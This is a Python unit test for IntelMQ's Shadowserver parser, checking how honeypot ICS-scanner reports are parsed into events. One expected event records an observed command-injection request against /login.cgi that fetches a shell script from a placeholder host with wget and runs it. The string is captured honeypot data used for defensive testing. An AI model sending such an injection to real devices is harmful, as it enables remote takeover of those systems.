# -*- coding: utf-8 -*-

import os
import unittest

import intelmq.lib.test as test
import intelmq.lib.utils as utils
from intelmq.bots.parsers.shadowserver.parser import ShadowserverParserBot

with open(os.path.join(os.path.dirname(__file__), 'testdata/hp_ics_scan.csv')) as handle:
    EXAMPLE_FILE = handle.read()
EXAMPLE_LINES = EXAMPLE_FILE.splitlines()

EXAMPLE_REPORT = {"feed.name": "ShadowServer ICS-Scanners",
                  "raw": utils.base64_encode(EXAMPLE_FILE),
                  "__type": "Report",
                  "time.observation": "2019-01-01T00:00:00+00:00",
                  "extra.file_name": "2019-01-01-hp_ics_scan-test-geo.csv",
                  }
EVENTS = [{'__type': 'Event',
           'feed.name': 'ShadowServer ICS-Scanners',
           'feed.name': 'ShadowServer ICS-Scanners',
           'classification.identifier': 'ics',
           'classification.taxonomy': 'information gathering',
           'classification.type': 'scanner',
           'raw': utils.base64_encode('\n'.join([EXAMPLE_LINES[0],
                                                 EXAMPLE_LINES[1]])),
           'time.observation': "2019-01-01T00:00:00+00:00",
           'time.source': "2018-09-16T00:00:54+00:00",
           'source.ip': "198.51.100.5",
           'source.port': 56066,
           'source.asn': 3462,
           'source.geolocation.cc': "TW",
           'source.geolocation.region': "KEELUNG CITY",
           'source.geolocation.city': "KEELUNG",
           'source.reverse_dns': "5.dynamic-ip.example.net",
           'protocol.application': "http",
           'extra.type': "ics-scan",
           'destination.ip': "203.0.113.10",
           'destination.port': 80,
           'destination.asn': 39324,
           'destination.geolocation.cc': "FI",
           'destination.fqdn': "203-0-113-10.example.net",
           'extra.naics': 518210,
           'extra.sic': 737415,
           'extra.sector': "Communications",
           'extra.destination.sector': "IT",
           'extra.public_source': "SISSDEN",
           'extra.sensorid': "000a14be-2fd9-408f-a855-fd7f984f6bca",
           'extra.state': "new_connection",
           'extra.slave_id': "aa-bb-cc",
           'extra.function_code': 1,
           'extra.request': "('/login.cgi?cli=aa%20aa%27;wget%20http://192.0.2.15/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$')",
           'extra.response': 404,
           },
           {'__type': 'Event',
           'feed.name': 'ShadowServer ICS-Scanners',
           'feed.name': 'ShadowServer ICS-Scanners',
           'classification.identifier': 'ics',
           'classification.taxonomy': 'information gathering',
           'classification.type': 'scanner',
           'raw': utils.base64_encode('\n'.join([EXAMPLE_LINES[0],
                                                 EXAMPLE_LINES[2]])),
           'time.observation': "2019-01-01T00:00:00+00:00",
           'time.source': "2018-09-16T23:51:13+00:00",
           'source.ip': "198.51.200.50",
           'source.port': 60565,
           'source.asn': 26599,
           'source.geolocation.cc': "BR",
           'source.geolocation.region': "SAO PAULO",
           'source.geolocation.city': "ITAPEVI",
           'source.reverse_dns': "198-51-200-50.example.net",
           'protocol.application': "http",
           'extra.type': "ics-scan",
           'destination.ip': "203.0.113.105",
           'destination.port': 80,
           'destination.asn': 15626,
           'destination.geolocation.cc': "UA",
           'destination.fqdn': "203-0-113-105.example.net",
           'extra.naics': 1,
           'extra.sic': 2,
           'extra.sector': "Communications",
           'extra.destination.sector': "IT",
           'extra.public_source': "SISSDEN",
           'extra.sensorid': "c010c930-fdbc-458c-b82d-d872d3ef206d",
           'extra.state': "new_connection",
           'extra.slave_id': "11-22-33",
           'extra.function_code': 2,
           'extra.request': "('/')",
           'extra.response': 302,
           },
          ]


class TestShadowserverParserBot(test.BotTestCase, unittest.TestCase):
    """
    A TestCase for a ShadowserverParserBot.
    """

    @classmethod
    def set_bot(cls):
        cls.bot_reference = ShadowserverParserBot
        cls.default_input_message = EXAMPLE_REPORT

    def test_event(self):
        """ Test if correct Event has been produced. """
        self.run_bot()
        for i, EVENT in enumerate(EVENTS):
            self.assertMessageEqual(i, EVENT)


if __name__ == '__main__':  # pragma: no cover
    unittest.main()
